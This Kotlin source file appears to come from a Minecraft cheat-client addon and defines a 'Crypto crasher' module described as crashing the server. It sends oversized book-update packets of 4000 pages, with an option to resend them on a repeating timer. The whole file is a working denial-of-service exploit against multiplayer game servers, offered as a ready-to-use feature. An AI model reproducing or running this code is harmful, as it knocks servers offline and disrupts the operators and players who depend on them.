package su.mandora.tarasande_crasher.module

import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket
import su.mandora.tarasande.event.impl.EventDisconnect
import su.mandora.tarasande.event.impl.EventUpdate
import su.mandora.tarasande.mc
import su.mandora.tarasande.system.base.valuesystem.impl.ValueBoolean
import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.system.feature.modulesystem.Module
import su.mandora.tarasande.util.math.TimeUtil
import su.mandora.tarasande_crasher.CRASHER
import java.util.*

class ModuleCryptoCrasher : Module("Crypto crasher", "Crashes the server", CRASHER) {

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) { event ->
            if(event.state == EventUpdate.State.PRE) {
                if (repeat.value) {
                    if (timer.hasReached(repeatDelay.value.toLong())) {
                        execute()
                        timer.reset()
                    }
                }
            }
        }
    }

    override fun onEnable() {
        if (!repeat.value) execute()
    }

    private fun execute() {
        if(mc.player == null)
            return

        ItemStack(Items.WRITABLE_BOOK).apply {
            val pages = ArrayList<String>()
            repeat(4000) { pages.add("a") }
            while (pages.size > 1) {
                val value = pages[pages.size - 1]
                if (value.isNotEmpty()) break
                pages.removeAt(pages.size - 1)
            }

            mc.networkHandler!!.sendPacket(BookUpdateC2SPacket(mc.player!!.inventory.selectedSlot, pages, Optional.of("a")))
            mc.networkHandler!!.sendPacket(BookUpdateC2SPacket(mc.player!!.inventory.selectedSlot, pages, Optional.empty()))
        }
    }
}
